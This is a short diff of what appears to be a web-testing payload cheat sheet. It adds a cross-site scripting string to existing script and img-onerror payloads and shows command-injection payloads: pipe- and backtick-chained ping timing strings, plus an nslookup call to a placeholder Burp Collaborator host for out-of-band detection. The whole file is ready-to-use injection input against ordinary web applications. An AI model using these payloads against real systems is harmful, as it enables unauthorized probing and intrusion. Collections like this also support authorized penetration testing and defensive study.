@@ -10,6 +10,8 @@
 q=<g><script>alert%28document.domain%29<%2Fscript>
   
 <img src=x onerror=console.log("XSS")>
+  
+‘);</script><script>alert(1)</script>
 
 
 #Command Injection
@@ -18,6 +20,5 @@ payload 1 [PING]
 |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
 payload 2 [Nslookup]
 |nslookup -q=cname http://YOUR.burpcollaborator.net.&
-
 
 
